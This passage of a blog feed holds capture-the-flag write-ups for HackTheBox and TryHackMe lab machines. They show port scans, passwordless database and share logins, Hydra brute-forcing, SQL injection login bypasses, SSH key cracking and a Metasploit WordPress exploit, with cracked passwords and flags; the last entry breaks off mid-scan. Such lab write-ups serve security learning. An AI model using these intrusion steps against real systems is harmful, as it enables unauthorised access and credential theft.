        <content type="html"><![CDATA[<p><img src="/../sequel_img/b783687f4acd9b12249440c9a8105e46.webp" alt="alt text"></p><h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><p>IP Address : 10.129.32.164</p><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h2><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">32.164</span></code></pre><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.05.png" alt="alt text"></p><ul><li>Port 3306 open - mysql</li></ul><p> During our scan, which port do we find serving MySQL? </p><ul><li>3306</li></ul><p> What community-developed MySQL version is the target running? </p><p>Let’s find out </p><p>Use -sC with NMAP </p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-sC</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">32.164</span></code></pre><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.23.png" alt="alt text"></p><p>Answer </p><ul><li>MariaDB</li></ul><p>When using the MySQL command line client, what switch do we need to use in order to specify a login username? </p><ul><li>-u</li></ul><p>Which username allows us to log into this MariaDB instance without providing a password? </p><p>After trying some basic usernames we find out the answer is <code>root</code> </p><p><code>mysql -u root -h 10.129.32.164</code></p><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.37.png" alt="alt text"></p><p>Answer:</p><ul><li>root</li></ul><p>In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? </p><ul><li><ul><li></li></ul></li></ul><p> In SQL, what symbol do we need to end each query with? </p><ul><li>;</li></ul><p> There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that’s unique to this host? </p><ul><li>htb</li></ul><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.47.png" alt="alt text"></p><p> Submit root flag :</p><p><code>use htb;</code> </p><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.41.59.png" alt="alt text"></p><p><img src="/../sequel_img/Screenshot%202024-05-16%20at%2021.42.22.png" alt="alt text"></p><p>FLAG : <code>7b4bec00d1a39e3dd4e021ec3d915da8</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Appointment</title>
      <link href="/2024/05/15/Appointment/"/>
      <url>/2024/05/15/Appointment/</url>
      
        <content type="html"><![CDATA[<p><img src="/../appointment_img/a9ddcda8d2f6eb388c6717de2caff896.webp" alt="alt text"></p><h2 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h2><p>Ip Address : 10.129.245.135</p><p> What does the acronym SQL stand for? </p><ul><li>Structured Query Language</li></ul><p> What is one of the most common type of SQL vulnerabilities? </p><ul><li>Sql Injection</li></ul><p> What is the 2021 OWASP Top 10 classification for this vulnerability? </p><ul><li>A03:2021-Injection</li></ul><p>NMAP Scanning : </p><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.245.135</code></pre><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.29.43.png" alt="alt text"></p><p>Port 80 open , that means we should have a web application :</p><p>NMAP Full Scanning:</p><pre><code class="hljs bash">nmap -A -sC -sV -p80 10.129.245.135 -Pn</code></pre><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.29.49.png" alt="alt text"></p><p> What does Nmap report as the service and version that are running on port 80 of the target? </p><ul><li>Apache httpd 2.4.38 ((Debian))</li></ul><p> What is the standard port used for the HTTPS protocol? </p><ul><li>443</li></ul><p> What is a folder called in web-application terminology? </p><ul><li>Directory</li></ul><p> What is the HTTP response code is given for ‘Not Found’ errors? </p><ul><li>404</li></ul><p>Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains? </p><ul><li>dir</li></ul><p> What single character can be used to comment out the rest of a line in MySQL? </p><ul><li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li></ul><p>If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?</p><ul><li>Congratulations</li></ul><p>Intercept the request with BurpSuite</p><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.29.55.png" alt="alt text"></p><p>Send the request to the Repeater</p><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.30.03.png" alt="alt text"></p><p>Add a single quote <code>&#39;</code> and a comment <code>#</code> and url encode it :</p><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.30.12.png" alt="alt text"></p><p>Hit send and get the flag from the Repeater’s response :</p><p><img src="/../appointment_img/Screenshot%202024-05-15%20at%2016.30.21.png" alt="alt text"></p><p>FLAG : <code>e3d0796d002a446c0e622226f42e9672</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dancing</title>
      <link href="/2024/05/05/Dancing/"/>
      <url>/2024/05/05/Dancing/</url>
      
        <content type="html"><![CDATA[<p><img src="/../dancing_images/ce52eadd09ff5a28a1eea8c65d6683a9.png" alt="alt text"></p><h1 id="Dancing"><a href="#Dancing" class="headerlink" title="Dancing"></a>Dancing</h1><p>Machine IP : 10.129.26.54</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning:"></a>NMAP Scanning:</h3><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.26.54</code></pre><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.34.png" alt="alt text"></p><p>-p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669</p><h3 id="Full-NMAP-Scanning"><a href="#Full-NMAP-Scanning" class="headerlink" title="Full NMAP Scanning:"></a>Full NMAP Scanning:</h3><pre><code class="hljs bash">nmap -A -sC -sV -p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.26.54 -Pn</code></pre><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.45.png" alt="alt text"></p><h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><pre><code class="hljs bash">smbclient -L \\\\10.129.26.54\\public</code></pre><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.55.png" alt="alt text"></p><p>Access <code>WorkShares</code> without a password:</p><pre><code class="hljs bash">smbclient //10.129.26.54/WorkShares -U ANONYMOUS</code></pre><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.07.png" alt="alt text"></p><p>Go into James.P</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.15.png" alt="alt text"></p><p>get flag.txt</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.24.png" alt="alt text"></p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.32.png" alt="alt text"></p><p>Flag: 5f61c10dffbc77a704d76016a22f1664</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redeemer</title>
      <link href="/2024/05/04/Redeemer/"/>
      <url>/2024/05/04/Redeemer/</url>
      
        <content type="html"><![CDATA[<p><img src="/../redeemer_images/cdf77651ab0a4eca65acd5cf388b4c66.webp" alt="alt text"></p><h1 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h1><p>Machine IP: 10.129.29.99</p><p>NMAP Scanning: </p><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.29.99</code></pre><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.04.png" alt="alt text"></p><p>Full NMAP Scanning:</p><pre><code class="hljs bash">nmap -A -sC -sV -p6379 10.129.29.99 -Pn</code></pre><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.13.png" alt="alt text"></p><p>Log in with redis-cli </p><pre><code class="hljs bash">redis-cli -h 10.129.29.99</code></pre><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.20.png" alt="alt text"></p><p>SELECT 0</p><p>KEYS *</p><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.40.png" alt="alt text"></p><p>GET flag :</p><p><img src="/../redeemer_images/Screenshot%202024-05-03%20at%2023.33.48.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fawn</title>
      <link href="/2024/05/03/fawn/"/>
      <url>/2024/05/03/fawn/</url>
      
        <content type="html"><![CDATA[<p><img src="/../fawn_images/b64f85071e626e4cc2272d54332e4131.webp" alt="alt text"></p><h1 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h1><p>Machine IP : 10.129.159.51</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.159.51</code></pre><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.19.19.png" alt="alt text"></p><p>Port 21 (ftp) opened </p><p>Connect to ftp with the username <code>anonymous</code> to log in anonymously :</p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.29.png" alt="alt text"></p><p><code>ls -la</code></p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.43.png" alt="alt text"></p><p><code>get flag.txt</code></p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.50.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basic Pentesting</title>
      <link href="/2024/04/23/Basic_Pentesting/"/>
      <url>/2024/04/23/Basic_Pentesting/</url>
      
        <content type="html"><![CDATA[<p><img src="/../bpentesting_img/1*MzkWDoTdVyg_NQPs9N_1AQ.png" alt="alt text"></p><p>Room Link: <a href="https://tryhackme.com/r/room/basicpentestingjt">https://tryhackme.com/r/room/basicpentestingjt</a></p><h1 id="Basic-Pentesting"><a href="#Basic-Pentesting" class="headerlink" title="Basic Pentesting"></a>Basic Pentesting</h1><p>NMAP Scanning : (sudo nmap -p- -sS –min-rate 5000 –open -T5 -vvv -Pn 10.10.25.177 | tee nmap&#x2F;10.10.25.177_nmap.txt)</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.14.25.png" alt="alt text"></p><pre><code class="hljs bash">PORT     STATE SERVICE      REASON22/tcp   open  ssh          syn-ack ttl 6380/tcp   open  http         syn-ack ttl 63139/tcp  open  netbios-ssn  syn-ack ttl 63445/tcp  open  microsoft-ds syn-ack ttl 638009/tcp open  ajp13        syn-ack ttl 638080/tcp open  http-proxy   syn-ack ttl 63</code></pre><p>Full NMAP Scanning :</p><pre><code class="hljs bash">nmap -A -sC -sV -p22,80,139,445,8009,8080 10.10.25.177 -Pn</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.15.54.png" alt="alt text"></p><p>Directory busting :</p><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.25.177](http://10.10.25.177/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.09.png" alt="alt text"></p><p>Found <code>/development</code> </p><p>Let’s check the website and port 8080</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.20.png" alt="alt text"></p><p>Blank page in maintenance , check for port 8080</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.27.png" alt="alt text"></p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.36.png" alt="alt text"></p><p>Try random credentials in Manager app </p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.51.png" alt="alt text"></p><p>Hit sign in, nothing happens,  hit cancel and we get this :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.17.03.png" alt="alt text"></p><p>Let’s try another directory busting attack for the 8080 port :</p><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.25.177:8080](http://10.10.25.177:8080/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.27.05.png" alt="alt text"></p><p>We found nothing..</p><p>Log in anonymous with smb:</p><pre><code class="hljs bash">smbclient \\\\10.10.25.177\\anonymous</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.17.48.png" alt="alt text"></p><p>Found a username : <code>Jan</code></p><p>Bruteforcing with Hydra :</p><pre><code class="hljs bash">hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.25.177 ssh</code></pre><p>After about 5 minutes we find the password :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.00.png" alt="alt text"></p><p>Password :<code>armando</code> </p><p>Now we succesfully logged in as jan with ssh :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.09.png" alt="alt text"></p><p>Now we need to escalate privileges  and get kay’s password, for that we’ll be using linpeas :</p><ul><li><a href="https://linpeas.sh/">https://linpeas.sh/</a></li></ul><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.19.png" alt="alt text"></p><p>Copied linpeas to the ssh session and made it executable with <code>chmod +x</code></p><p>Run it </p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.30.png" alt="alt text"></p><p>Found an id_rsa of kay , create a new file with the name <code>kay_id_rsa</code></p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.56.png" alt="alt text"></p><p>As it tells us the password is protected so we’ll use JohnTheRipper to crack it:</p><pre><code class="hljs bash">john kay_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.04.png" alt="alt text"></p><p>Now we will go back to jan’s ssh session and run this:</p><pre><code class="hljs bash">ssh -i /home/kay/.ssh/id_rsa kay@10.10.25.177</code></pre><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.13.png" alt="alt text"></p><p>It asks us to give the passphrase and we have it <code>beeswax</code></p><p>Get the flag :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.23.png" alt="alt text"></p><p>Flag : <code>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog</title>
      <link href="/2024/04/22/Blog/"/>
      <url>/2024/04/22/Blog/</url>
      
        <content type="html"><![CDATA[<p><img src="/../blog_images/618f1cc93596ff4082250bce9d869767.png" alt="alt text"></p><p>Room Link: <a href="https://tryhackme.com/r/room/blog">https://tryhackme.com/r/room/blog</a></p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Firstly we need to add the IP Address to <code>/etc/hosts</code> </p><p><code>sudo nano /etc/hosts</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.23.png" alt="alt text"></p><p>NMAP Scanning :</p><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.155.138</code></pre><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.06.png" alt="alt text"></p><p>FULL NMAP Scanning : </p><pre><code class="hljs bash">sudo nmap -A -sC -sV -p80,445,22,139 10.10.155.138 -Pn</code></pre><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.15.png" alt="alt text"></p><p>Let’s check smb :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.44.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.54.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2017.19.50.png" alt="alt text"><br>These seem like some images .jpg non interesting.</p><p>Directory Busting :</p><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.155.138](http://10.10.155.138/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.11.png" alt="alt text"></p><p>Gobuster found some interesting directories, check for <code>/rss</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.19.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.25.png" alt="alt text"></p><p>Seems like a XML File with the site:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.31.png" alt="alt text"></p><p><code>/atom</code> downloaded us another file </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.40.png" alt="alt text"></p><p>Let’s check out &#x2F;login </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.49.png" alt="alt text"></p><p>Since we have Wordpress we can use WPScan:</p><pre><code class="hljs bash">┌──(kali㉿kali)-[~/…/Workspace/TryHackMe/Boxes/Blog]└─$ wpscan --url http://blog.thm --enumerate ap,dbe,cb,u --detection-mode aggressive</code></pre><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.56.png" alt="alt text"></p><p>Found 2 users : </p><ul><li>bjoel          (Billy Joel)</li><li>kwheel      (Karen Wheelerr)</li></ul><p>Performing bruteforce on both users :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.06.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.12.png" alt="alt text"></p><p>Found a password for kwheel:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.19.png" alt="alt text"></p><p>Password : <code>cutiepie1</code> </p><p>Log in with the credentials found :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.30.png" alt="alt text"></p><p>We know the web application is running wordpress 5.0 which has a known Remote Code Execution vulnerability: </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.37.png" alt="alt text"></p><p><a href="https://www.exploit-db.com/exploits/46662">https://www.exploit-db.com/exploits/46662</a></p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p><code>msfconsole</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.46.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.55.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.02.png" alt="alt text"></p><p>Spawning <code>/bin/bash</code> using python:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.09.png" alt="alt text"></p><p>Finding SUID Binaries :</p><p><code>www-data@blog:/var/www/wordpress$ find / -type f -perm -u=s 2&gt;/dev/null</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.16.png" alt="alt text"></p><p>If we try to run that we get that we are not an admin:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.21.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.26.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.32.png" alt="alt text"></p><p>Found first flag :</p><p><code>c8421899aae571f7af486492b71a8ab7</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.39.png" alt="alt text"></p><p>Found second flag :</p><p><code>9a0b2b618bef9bfa7ac28c1353d9f318</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.46.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lesson Learned?</title>
      <link href="/2024/04/19/LessonLearned/"/>
      <url>/2024/04/19/LessonLearned/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/maxresdefault.jpg" alt="alt text"></p><p>Room link : <a href="https://tryhackme.com/r/room/lessonlearned">https://tryhackme.com/r/room/lessonlearned</a></p><h1 id="Lesson-Learned"><a href="#Lesson-Learned" class="headerlink" title="Lesson Learned?"></a>Lesson Learned?</h1><p>IP Address  :(10.10.63.208)</p><p>We have a web application with a Login form :</p><p><img src="/../images/a1.png" alt="alt text"></p><p>Let’s try a default XSS :</p><p><img src="/../images/a2.png" alt="alt text"></p><p>Not working , robots txt maybe?</p><p><img src="/../images/a3.png" alt="alt text"></p><p>Nope.</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.63.208</code></pre><p><img src="/../images/a4.png" alt="alt text"></p><p>Ports open : </p><ul><li>22 ssh</li><li>80 http</li></ul><p>Full NMAP Scanning :</p><pre><code class="hljs bash">nmap -A -sC -sV -p80,22 10.10.55.21 -Pn</code></pre><p><img src="/../images/a5.png" alt="alt text"></p><h3 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h3><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.63.208](http://10.10.63.208/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../images/a6.png" alt="alt text"></p><p>Found &#x2F;manual  but there’s nothing</p><p><img src="/../images/a7.png" alt="alt text"></p><p>Let’s try to bypass the Login with an SQL Payload :</p><p><img src="/../images/a8.png" alt="alt text"></p><p><img src="/../images/a9.png" alt="alt text"></p><p>Here we got a hint that tells us we should use a <code>less destructive</code> payload :</p><p><img src="/../images/a10.png" alt="alt text"></p><p>We have a lot of payloads here : <a href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a></p><p>Let’s reset the machine and try another SQL payload to bypass the login .. didn’t find anything, try to bruteforce the username with hydra :</p><pre><code class="hljs bash">hydra -L /home/kali/Desktop/Workspace/TryHackMe/SecLists/Usernames/xato-net-10-million-usernames.txt -p asd 10.10.93.0 http-post-form   <span class="hljs-string">&quot;/:username=^USER^&amp;password=^PASS^: Invalid username and password.&quot;</span></code></pre><p><img src="/../images/a11.png" alt="alt text"></p><p>Ater trying this payload <code>admin’ AND 1=1#</code> with all the usernames finally one worked </p><p><code>martin&#39; AND 1=1#</code></p><p><img src="/../images/a11.png" alt="alt text"></p><p><img src="/../images/a12.png" alt="alt text"></p><p><img src="/../images/a13.png" alt="alt text"></p><p>So we found the flag!</p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mr Robot</title>
      <link href="/2024/04/16/MrRobot/"/>
      <url>/2024/04/16/MrRobot/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/7a8797ae59733f2a72f0e8a8748be128.jpeg" alt="alt text"></p><h3 id="Head-into-the-IP-Address-given"><a href="#Head-into-the-IP-Address-given" class="headerlink" title="Head into the IP Address given :"></a>Head into the IP Address given :</h3><p>10.10.50.127</p><p><img src="/../images/1.png" alt="alt text"></p><p>After trying all those commands , i didn’t find anything interesting . First thing i got in my mind is to go and see if we find something in <code>/robots.txt</code> :</p><p><img src="/../images/2.png" alt="alt text"></p><p>We find <code>key-1-of-3.txt</code> let’s head into that :</p><p>We got the flag : <code>073403c8a58a1f80d943455fb30724b9</code></p><p>Let’s see <code>fsociety.dic</code> aswell :</p><p><img src="/../images/3.png" alt="alt text"></p><p><img src="/../images/4.png" alt="alt text"></p><p>It seems like this is a list of passwords. </p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h3><p><code>( sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.50.127 )</code></p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">TryHackMe</span>/<span class="hljs-type">Boxes</span>/<span class="hljs-type">mrrobot</span>]└─<span class="hljs-variable">$</span>  sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">50.127</span>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-04-16</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span> EDTInitiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">14</span>:<span class="hljs-number">00</span>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">14</span>:<span class="hljs-number">00</span>, <span class="hljs-number">0.04</span>s elapsedDNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.04</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span><span class="hljs-type">Scanning</span> <span class="hljs-number">10.10</span><span class="hljs-type">.50.127</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">443</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.10</span><span class="hljs-type">.50.127</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">80</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.10</span><span class="hljs-type">.50.127</span><span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span>, <span class="hljs-number">26.58</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.10</span><span class="hljs-type">.50.127</span><span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.086</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span><span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">16</span> <span class="hljs-number">14</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">27</span><span class="hljs-type">s</span><span class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">65532</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>), <span class="hljs-number">1</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">port</span> (<span class="hljs-type">reset</span>)<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span><span class="hljs-type">PORT</span>    <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">REASON</span><span class="hljs-number">80</span>/<span class="hljs-type">tcp</span>  <span class="hljs-type">open</span>  <span class="hljs-type">http</span>    <span 